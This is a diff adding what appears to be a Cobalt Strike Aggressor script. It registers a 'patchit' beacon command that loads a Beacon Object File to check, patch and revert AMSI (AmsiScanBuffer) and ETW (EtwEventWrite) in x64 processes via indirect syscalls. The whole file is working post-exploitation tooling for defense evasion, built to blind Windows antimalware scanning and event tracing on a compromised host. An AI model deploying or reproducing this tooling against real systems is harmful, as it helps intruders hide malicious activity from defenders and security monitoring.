@@ -1,0 +1,87 @@
+beacon_command_register(
+    "patchit", 
+    "All-in-one to patch, check and revert AMSI and ETW for x64 process with indirect syscalls for NtApi", 
+    "Available Commands:\n" .
+        "\tCheck if AMSI & ETW are patched:      patchit check\n" .
+        "\tPatch AMSI and ETW:                   patchit all\n" .
+        "\tPatch AMSI (AmsiScanBuffer):          patchit amsi\n" .
+        "\tPatch ETW (EtwEventWrite):            patchit etw\n" .
+        "\tRevert patched AMSI & ETW:            patchit revertAll\n" .
+        "\tRevert patched AMSI:                  patchit revertAmsi\n" .
+        "\tRevert patched ETW:                   patchit revertEtw\n" .
+        "Note: check command only compares first 4 lines of addresses of functions."
+);
+
+alias patchit {
+
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("patchit"));
+        return;
+    }
+
+    local('$barch $handle $data $args');
+
+    # Get beacon architecture
+    $barch = barch($1);
+
+
+    if ($barch !eq 'x64')
+    {
+        berror($1, "patchit only supports x64 process");
+        return;
+    }
+
+    if ($2 eq "check")
+    {
+        $args = bof_pack($1,"i",1);
+    }
+
+    else if ($2 eq "all")
+    {
+        $args = bof_pack($1,"i",2);
+    }
+
+    else if ($2 eq "amsi")
+    {
+        $args = bof_pack($1,"i",3);
+    }
+
+    else if ($2 eq "etw")
+    {
+        $args = bof_pack($1,"i",4);
+    }
+
+    else if ($2 eq "revertAll")
+    {
+        $args = bof_pack($1,"i",5);
+    }
+
+    else if ($2 eq "revertAmsi")
+    {
+        $args = bof_pack($1,"i",6);
+    }
+
+    else if ($2 eq "revertEtw")
+    {
+        $args = bof_pack($1,"i",7);
+    }
+    else
+    {
+        berror($1, "Unkown command: " . $2);
+        berror($1, beacon_command_detail("patchit"));
+        return;
+    }
+
+
+    # Load BOF
+    $handle = openf(script_resource("patchit. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Execute BOF
+    btask($1, "All-in-one to patch, check and revert AMSI and ETW for x64 process with indirect syscalls for NtApi | James Yeung | github.com/ScriptIdiot");
+    beacon_inline_execute($1, $data, "go", $args);
+
+}
